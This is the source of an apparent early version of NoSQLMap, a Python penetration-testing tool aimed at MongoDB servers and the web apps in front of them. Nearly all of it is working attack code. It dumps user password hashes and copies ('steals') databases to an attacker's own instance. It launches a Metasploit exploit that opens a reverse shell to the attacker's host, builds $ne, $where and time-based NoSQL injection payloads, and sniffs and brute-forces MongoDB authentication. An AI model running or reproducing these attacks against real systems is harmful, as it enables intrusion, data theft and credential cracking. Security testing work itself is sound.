#!/usr/bin/python
#NoSQLMap Copyright 2013 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

####_mitm_####
from scapy.all import *
import re
import hashlib
md5 = hashlib.md5
##############

import sys
import string
import random
import os
import time
import httplib2
import urllib
import pymongo
import subprocess

#Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
global optionSet
optionSet = [False,False,False,False,False,False]


def mainMenu():
	select = True
	while select:
		os.system('clear')
		#label = subprocess.check_output(["git","describe","--always"])
		print "NoSQLMap-v0.15"
		print "nosqlmap@gmail.com"
		print "\n"
		print "1-Set options (do this first)"
		print "2-NoSQL DB Access Attacks"
		print "3-NoSQL Web App attacks"
		print "4-NoSQL MongoDB MiTM sniff and brute password"
		print "99-Exit"

		select = raw_input("Select an option:")

		if select == "1":
			options()

		##
		if select == "4":
			mitm()
		##

		elif select == "2":
			if optionSet[0] == True:
				netAttacks(victim)
				
			#Check minimum required options
			else:
				raw_input("Target not set! Check options.  Press enter to continue...")
				mainMenu()
				
		
		elif select == "3":
			#Check minimum required options
			if (optionSet[0] == True) and (optionSet[2] == True):	
				webApps()
			
			else:
				raw_input("Options not set! Check Host and URI path.  Press enter to continue...")
				mainMenu()

		elif select == "99":
			sys.exit()
			
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			mainMenu()
			

def options():
	global victim
	global webPort
	global uri
	global httpMethod
	global myIP
	global myPort
	
	#Set default value if needed
	if optionSet[0] == False:
		victim = "Not Set"
	if optionSet[1] == False:
		webPort = 80
		optionSet[1] = True
	if optionSet[2] == False:
		uri = "Not Set"
	if optionSet[3] == False:
		httpMethod = "GET"
	if optionSet[4] == False:
		myIP = "Not Set"
	if optionSet[5] == False:
		myPort = "Not Set"
	
	select = True
	
	while select:	
		print "\n\n"
		print "Options"
		print "1-Set target host/IP (Current: " + str(victim) + ")"
		print "2-Set web app port (Current: " + str(webPort) + ")" 
		print "3-Set App Path (Current: " + str(uri) + ")"
		print "4-Set HTTP Request Method (GET/POST)"
		print "5-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
		print "6-Set shell listener port (Current: " + str(myPort) + ")"
		print "7-Load options file"
		print "8-Save options file"
		print "9-Back to main menu"

		select = raw_input("Select an option: ")
		
		if select == "1":
			victim = raw_input("Enter the host IP/DNS name: ")
			print "\nTarget set to " + victim + "\n"
			optionSet[0] = True
			options()
			
		elif select == "2":
			webPort = raw_input("Enter the HTTP port for web apps: ")
			print "\nHTTP port set to " + webPort + "\n"
			optionSet[1] = True
			options()

		elif select == "3":
			uri = raw_input("Enter URI Path (Press enter for no URI): ")
			print "\nURI Path set to " + uri + "\n"
			optionSet[2] = True
			options()

		#NOT IMPLEMENTED YET FOR USE
		elif select == "4":
			httpMethod = True
			while httpMethod:

				print "1-Send request as a GET"
				print "2-Send request as a POST"
				httpMethod = raw_input("Select an option: ")
			
				if httpMethod == "1":
					print "GET request set"
					optionSet[3] = True
					options()

				elif httpMethod == "2":
					print "POST request set"
					optionSet[3] = True
					options()
				else:
					print "Invalid selection"

		elif select == "5":
			myIP = raw_input("Enter host IP for my Mongo/Shells: ")
			print "Shell IP set to " + myIP + "\n"
			optionSet[4] = True
			options()
		
		elif select == "6":
			myPort = raw_input("Enter TCP listener for shells: ")
			print "Shell TCP listener set to " + myPort + "\n"
			optionSet[5] = True
			options()
			
		elif select == "7":
			loadPath = raw_input("Enter file name to load: ")
			try:
				fo = open(loadPath,"r" )
				csvOpt = fo.read()
				fo.close()
				optList = csvOpt.split(",")
				victim = optList[0]
				webPort = optList[1]
				uri = optList[2]
				httpMethod = optList[3]
				myIP = optList[4]
				myPort = optList[5]
			
				#Set option checking array based on what was loaded
				x = 0
				for item in optList:
					if item != "Not Set":
						optionSet[x] = True
					x += 1
			except:
				print "Couldn't load options file!"
			options()
			
		elif select == "8":
			savePath = raw_input("Enter file name to save: ")
			try:
				fo = open(savePath, "wb")
				fo.write(str(victim) + "," + str(webPort) + "," + str(uri) + "," + str(httpMethod) + "," + str(myIP) + "," + str(myPort)) 
				fo.close()
				print "Options file saved!"
			except:
				print "Couldn't save options file."
		elif select == "9":
			mainMenu()

def netAttacks(target):
	mgtOpen = False
	webOpen = False
	#This is a global for future use with other modules; may change
	global dbList
	
	srvNeedCreds = raw_input("Does the database server need credentials? ")
	
	if srvNeedCreds == "n" or srvNeedCreds == "N":
		
		try:
			conn = pymongo.MongoClient(target,27017)
			print "MongoDB port open on " + target + ":27017!"
			mgtOpen = True
	
		except:
			print "MongoDB port closed."
		
		
	
	
	elif srvNeedCreds == "y" or srvNeedCreds == "Y":
		srvUser = raw_input("Enter server username: ")
		srvPass = raw_input("Enter server password: ")
		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + victim +"/"

		try:
			conn = pymongo.MongoClient(uri)
			print "MongoDB authenticated on " + target + ":27017!"
			mgtOpen = True
		except:
			raw_input("Failed to authenticate.  Press enter to continue...")
			mainMenu()
	
	
	mgtUrl = "http://" + target + ":28017"	
	#Future rev:  Add web management interface parsing
	
	try:
		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
		if mgtRespCode == 200:
			print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
			
	except:
		
		print "MongoDB web management closed or requires authentication."
		
	if mgtOpen == True:
		#Ths is compiling server info?????
		print "Server Info:"
		serverInfo = conn.server_info()
		print serverInfo

		print "\n"
		
		try:
			print "List of databases:"
			dbList = conn.database_names()
			print "\n".join(dbList)
			print "\n"
			
		except:
			print "Error:  Couldn't list databases.  The provided credentials may not have rights."
		
		print "List of collections:"
		#print "\n"
		
		try:
			for dbItem in dbList:
				db = conn[dbItem]
				colls = db.collection_names()
				print dbItem + ":"
				print "\n".join(colls)
				if 'system.users' in colls:
					users = list(db.system.users.find())
					print "Database Users and Password Hashes:"
					#print dbItem
					print str(users)
			#print "\n"
		
		except:
			print "Error:  Couldn't list collections.  The provided credentials may not have rights."
			
		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
		
		if stealDB == "y" or stealDB == "Y":
			stealDBs (myIP)
			
		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
		
		if getShell == "y" or getShell == "Y":
			#Launch Metasploit exploit
			try:
				proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
			
			except:
				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."	
	raw_input("Press enter to continue...")
	return()
		
	
	
def webApps():
	paramName = []
	paramValue = []
	vulnAddrs = []
	possAddrs = []
	appUp = False
	strTbAttack = False
	intTbAttack = False
	
	#Verify app is working.  
	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
	
	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
	
	try:
		appRespCode = urllib.urlopen(appURL).getcode()
		if appRespCode == 200:
			normLength = int(len(urllib.urlopen(appURL).read()))
			timeReq = urllib.urlopen(appURL)
			start = time.time()
			page = timeReq.read()
			end = time.time()
			timeReq.close()
			timeBase = round((end - start), 3)
			
			
			
			print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
			appUp = True
		
		else:
			print "Got " + appRespCode + "from the app, check your options."
	except:
		print "Looks like the server didn't respond.  Check your options."
	
	if appUp == True:
			
		injectSize = raw_input("Baseline test-Enter random string size: ")
		injectString = randInjString(int(injectSize))
		print "Using " + injectString + " for injection testing.\n"
		
		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
		randomUri = buildUri(appURL,injectString)
		print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
		randLength = int(len(urllib.urlopen(randomUri).read()))
		print "Got response length of " + str(randLength) + "."
		
		randNormDelta = abs(normLength - randLength)
		
		if randNormDelta == 0: 
			print "No change in response size injecting a random parameter..\n"
		else:
			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter value!\n"
			
		print "Testing Mongo PHP not equals associative array injection using " + neqUri +"..."
		injLen = int(len(urllib.urlopen(neqUri).read()))
		print "Got response length of " + str(injLen) + "."
		
		randInjDelta = abs(injLen - randLength)
		
		if (randInjDelta >= 100) and (injLen != 0) :
			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
			vulnAddrs.append(neqUri)
		
		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
			possAddrs.append(neqUri)
		
		elif (randInjDelta == 0):
			print "Random string response size and not equals injection were the same. Injection did not work."
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(neqUri)
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
		print "Injecting " + whereStrUri
		
		whereStrLen = int(len(urllib.urlopen(whereStrUri).read()))
		whereStrDelta = abs(whereStrLen - randLength)
		
		if (whereStrDelta >= 100) and (whereStrLen > 0):
			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
			vulnAddrs.append(whereStrUri)
		
		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(whereStrUri)
			
		elif (whereStrDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(whereStrUri)
		
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
		print "Injecting " + whereIntUri
		
		whereIntLen = int(len(urllib.urlopen(whereIntUri).read()))
		whereIntDelta = abs(whereIntLen - randLength)
		
		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(whereIntUri)
			
		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(whereIntUri)
			
		elif (whereIntDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(whereIntUri)
			
		#Start a single record attack in case the app expects only one record back
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
		print " Injecting " + whereOneStr
		
		
		whereOneStrLen = int(len(urllib.urlopen(whereOneStr).read()))
		whereOneStrDelta = abs(whereOneStrLen - randLength)
			
		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
			vulnAddrs.append(whereOneStr)
		
		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(whereOneStr)
			
		elif (whereOneStrDelta == 0):
			print "Random string response size and $where single injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(whereOneStr)
			
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
		print " Injecting " + whereOneInt
		
		
		whereOneIntLen = int(len(urllib.urlopen(whereOneInt).read()))
		whereOneIntDelta = abs(whereOneIntLen - randLength)				
			
		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(whereOneInt)
		
		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(whereOneInt)
			
		elif (whereOneIntDelta == 0):
			print "Random string response size and $where single record injection were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(whereOneInt)
			
		print "\n"
		print "Testing Mongo this not equals string escape attack for all records..."
		print " Injecting " + strThisNeqUri
		
		whereThisStrLen = int(len(urllib.urlopen(strThisNeqUri).read()))
		whereThisStrDelta = abs(whereThisStrLen - randLength)
		
		if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(strThisNeqUri)
		
		elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
			print " response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(strThisNeqUri)
			
		elif (WhereThisStrDelta == 0):
			print "Random string response size and this return response size were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(strThisNeqUri)
			
		print "\n"
		print "Testing Mongo this not equals integer escape attack for all records..."
		print " Injecting " + intThisNeqUri
		
		whereThisIntLen = int(len(urllib.urlopen(intThisNeqUri).read()))
		whereThisIntDelta = abs(whereThisIntLen - randLength)
		
		if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(intThisNeqUri)
		
		elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
			print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(intThisNeqUri)
			
		elif (whereThisIntDelta == 0):
			print "Random string response size and this return response size were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(intThisNeqUri)
			
			
		doTimeAttack = raw_input("Start timing based tests?")
		
		if doTimeAttack == "y" or doTimeAttack == "Y":
			print "Starting Javascript string escape time based injection..."
			start = time.time()
			strTimeInj = urllib.urlopen(timeStrUri)
			page = strTimeInj.read()
			end = time.time()
			strTimeInj.close()
			#print str(end)
			#print str(start)
			strTimeDelta = (int(round((end - start), 3)) - timeBase)
			#print str(strTimeDelta)
			if strTimeDelta > 25:
				print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
				strTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(strTimeDelta) + ".  Injection probably didn't work."
				strTbAttack = False
			
			print "Starting Javascript integer escape time based injection..."
			start = time.time()
			intTimeInj = urllib.urlopen(timeIntUri)
			page = intTimeInj.read()
			end = time.time()
			intTimeInj.close()
			#print str(end)
			#print str(start)
			intTimeDelta = (int(round((end - start), 3)) - timeBase)
			#print str(strTimeDelta)
			if intTimeDelta > 25:
				print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
				intTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(intTimeDelta) + "seconds.  Injection probably didn't work."
				intTbAttack = False
		
		print "\n"	
		print "Vunerable URLs:"
		print "\n".join(vulnAddrs)
		print "\n"
		print "Possibly vulnerable URLs:"
		print"\n".join(possAddrs)
		print "\n"
		print "Timing based attacks:"
		
		if strTbAttack == True:
			print "String attack-Successful"
		else:
			print "String attack-Unsuccessful"
		if intTbAttack == True:
			print "Integer attack-Successful"
		else:
			print "Integer attack-Unsuccessful"
		
		fileOut = raw_input("Save results to file?")
		
		if fileOut == "y" or fileOut == "Y":
			savePath = raw_input("Enter output file name: ")
			fo = open(savePath, "wb")
			fo.write ("Vulnerable URLs:\n")
			fo.write("\n".join(vulnAddrs))
			fo.write("\n\n")
			fo.write("Possibly Vulnerable URLs:\n")
			fo.write("\n".join(possAddrs))
			fo.write("\n")
			fo.write("Timing based attacks:\n")
			
			if strTbAttack == True:
				fo.write("String Attack-Successful\n")
			else:
				fo.write("String Attack-Unsuccessful\n")
			fo.write("\n")
			
			if intTbAttack == True:
				fo.write("Integer attack-Successful\n")
			else:
				fo.write("Integer attack-Unsuccessful\n")
			fo.write("\n")
			fo.close()
		
	raw_input("Press enter to continue...")
	return()

def randInjString(size):
	print "What format should the random string take?"
	print "1-Alphanumeric"
	print "2-Letters only"
	print "3-Numbers only"
	print "4-Email address"
	format = raw_input("Select an option: ")
	
	if format == "1":
		chars = string.ascii_letters + string.digits
		return ''.join(random.choice(chars) for x in range(size))
	
	elif format == "2":
		chars = string.ascii_letters
		return ''.join(random.choice(chars) for x in range(size))
	
	elif format == "3":
		chars = string.digits
		return ''.join(random.choice(chars) for x in range(size))
	
	elif format == "4":
		chars = string.ascii_letters + string.digits
		return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'
	

def buildUri(origUri, randValue):
	paramName = []
	paramValue = []
	global neqUri
	global whereStrUri
	global whereIntUri
	global whereOneStr
	global whereOneInt
	global timeStrUri
	global timeIntUri
	global strThisNeqUri
	global intThisNeqUri
	injOpt = ""
	
	#Split the string between the path and parameters, and then split each parameter
	split_uri = origUri.split("?")
	params = split_uri[1].split("&")
	
	for item in params:
		index = item.find("=")
		paramName.append(item[0:index])
		paramValue.append(item[index + 1:len(item)])
		
	menuItem = 1
	print "List of parameters:"
	for params in paramName:
		print str(menuItem) + "-" + params
		menuItem += 1
		
	
	
	try:
		injIndex = raw_input("Which parameter should we inject? ")
		injOpt = str(paramName[int(injIndex)-1])
		print "Injecting the " + injOpt + " parameter..."
	except:
		raw_input("Something went wrong.  Press enter to return to the main menu...")
		mainMenu()

	evilUri = split_uri[0] + "?"
	neqUri = split_uri[0] + "?"
	whereStrUri = split_uri[0] + "?"
	whereIntUri = split_uri[0] + "?"
	whereOneStr = split_uri[0] + "?"
	whereOneInt = split_uri[0] + "?"
	timeStrUri = split_uri[0] + "?"
	timeIntUri = split_uri[0] + "?"
	strThisNeqUri = split_uri[0] + "?"
	intThisNeqUri = split_uri[0] + "?"
	x = 0
	
	for item in paramName:		
		if paramName[x] == injOpt:
			evilUri += paramName[x] + "=" + randValue + "&"
			neqUri += paramName[x] + "[$ne]=" + randValue + "&"
			whereStrUri += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
			whereIntUri += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
			whereOneStr += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
			whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
			timeStrUri  += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
			timeIntUri  += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
			strThisNeqUri += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
			intThisNeqUri += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"

		else:
			evilUri += paramName[x] + "=" + paramValue[x] + "&"
			neqUri += paramName[x] + "=" + paramValue[x] + "&"
			whereStrUri += paramName[x] + "=" + paramValue[x] + "&"
			whereIntUri += paramName[x] + "=" + paramValue[x] + "&"
			whereOneStr += paramName[x] + "=" + paramValue[x] + "&"
			whereOneInt += paramName[x] + "=" + paramValue[x] + "&"
			timeStrUri += paramName[x] + "=" + paramValue[x] + "&"
			timeIntUri += paramName[x] + "=" + paramValue[x] + "&"
			strThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
			intThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
		x += 1
		
	#Clip the extra & off the end of the URL
	evilUri = evilUri[:-1]
	neqUri = neqUri[:-1]
	whereStrUri = whereStrUri[:-1]
	whereIntUri = whereIntUri[:-1]
	whereOneStr = whereOneStr[:-1]
	whereOneInt = whereOneInt[:-1]
	timeStrUri = timeStrUri[:-1]
	timeIntUri = timeIntUri[:-1]
	
	return evilUri

def stealDBs(myDB):
	menuItem = 1	
	
	for dbName in dbList:
		print str(menuItem) + "-" + dbName
		menuItem += 1
	
	try:
		dbLoot = raw_input("Select a database to steal:")
	
	except:
		print "Invalid selection."
		stealDBs(myDB)
		
	try:
		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
		dbNeedCreds = raw_input("Does this database require credentials? ")
		
		if dbNeedCreds == "n" or dbNeedCreds == "N":	
			myDBConn = pymongo.MongoClient(myDB,27017)
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
		
		elif dbNeedCreds == "y" or dbNeedCreds == "Y":
			dbUser = raw_input("Enter database username: ")
			dbPass = raw_input("Enter database password: ")
			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)
		
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			stealDBs(myDB)
			
		cloneAnother = raw_input("Database cloned.  Copy another?")
		
		if cloneAnother == "y" or cloneAnother == "Y":
			stealDBs(myDB)
		
		else:
			return()
	
	except:
		raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
		mainMenu()								


####__MiTM__####
###cyber-punk###

def mitm():
	
	class mitm(object):
	    
		def get_packets(self, port, iface, count):
			
			packets = sniff(filter="port "+str(port)+"", count=count, iface=str(iface))
			return packets

		def parse_packets(self, port, iface, count):
	

			print "Sniff packages..."
			packets = self.get_packets(port, iface, count)
			print "Parse packages..."
			for i in xrange(len(packets)):
				if "key" in re.findall(r'[A-Za-z0-9]{3,}', str(packets[i])):
					packet=packets[i]
					break
			user = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[4]
			nonce = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[6]
			key = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[8]
			return user, nonce, key
		
		def gen_pass(self, user, nonce, passw):
			
			
			return md5(nonce + user + md5(user + ":mongo:" + str(passw)).hexdigest()).hexdigest();


		def brute_pass(self, port, iface, dictionary):
			
			

			count = 10 # count of packets which should be sniffed

			
			
			nonce, user, key = self.parse_packets(str(port), str(iface), int(count))
			print "Prepair to brute..."
			file = open(dictionary)
			file_len = open(dictionary)
			
			for i in xrange(len(file_len.readlines())):
				passw = file.readline().split('\n')[0]
				
				if self.gen_pass(user, nonce, passw) == key:
					raw_input("\nFound - "+user+":"+passw)
					break
			exit
		
		def test(self):
			self.test1("string")
		def test1(self, string):
			self.string = string
			print string
	

	print "\nSniff and brute mongo password."
	start = raw_input("Prepare to start (Y/N)? ")	
	
	if start == "y" or start == "Y":
		next = raw_input("Port (default 27017): ")
		if type(next) != int:
			port = 27017
		else:
			port = next
		next = raw_input("Interface to sniff: ")
		if type(next) != str:
			print "Error!"
			exit
		else:
			iface=next
			next= raw_input("Full path to dictionary for brute: ")
		if type(next) != str:
			print "Error!"
			exit
		else:
			dictionary = next
	else:
		exit


	start = raw_input("Start? (Y/N)")
	if start == "y" or start == "Y":
		MiTM = mitm()
		MiTM.brute_pass(port, iface, dictionary)
	

################

mainMenu()

